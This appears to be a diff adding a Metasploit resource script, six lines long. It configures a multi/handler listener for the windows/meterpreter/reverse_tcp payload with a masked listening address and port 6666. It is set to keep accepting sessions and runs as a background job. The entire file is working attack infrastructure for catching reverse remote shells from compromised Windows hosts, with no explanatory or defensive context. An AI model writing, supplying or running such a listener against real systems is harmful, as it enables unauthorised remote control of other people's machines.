@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST xx.xx.xx.xx
+set LPORT 6666
+set ExitOnSession false
+exploit -j -z
